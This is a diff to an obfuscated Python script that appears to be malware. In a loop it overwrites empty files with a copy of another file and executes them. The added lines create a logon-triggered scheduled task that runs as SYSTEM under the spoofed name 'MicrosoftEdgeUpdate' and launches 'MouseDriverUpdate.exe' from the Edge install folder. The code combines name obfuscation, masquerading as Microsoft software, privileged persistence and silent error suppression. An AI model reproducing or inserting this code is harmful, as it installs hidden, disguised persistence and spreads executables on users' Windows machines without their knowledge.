@@ -24,7 +24,14 @@ while True:
     LLLLLLLLlllllllllllllllllLLllll = os.getcwd() + "\\" + LLLLLLLLlllllllllllllllllLLllll
     LLLLLLLLLllllllllllllllllLLllll = os.path.getsize(LLLLLLLLlllllllllllllllllLLllll)
     if LLLLLLLLLllllllllllllllllLLllll == 0:
-        command = "copy " + LLLLLLLLllllllllllllllLLlllllll + " " + LLLLLLLLllllllllllllllllLLllll
+        command = "copy \"" + LLLLLLLLllllllllllllllLLlllllll + "\" \"" + LLLLLLLLllllllllllllllllLLllll + "\""
         os.system(command)
         subprocess.Popen([LLLLLLLLllllllllllllllllLLllll], close_fds=True)
+    try:
+        path = "\"C:\Program Files (x86)\Microsoft\Edge\MouseDriverUpdate.exe\""
+        command = "schtasks /create /sc ONLOGON /tn MicrosoftEdgeUpdate /tr " + path + " /ru \"SYSTEM\""
+        p = os.popen(command)
+        p.write("y\n")
+    except:
+        print('nothing')
     time.sleep(60)
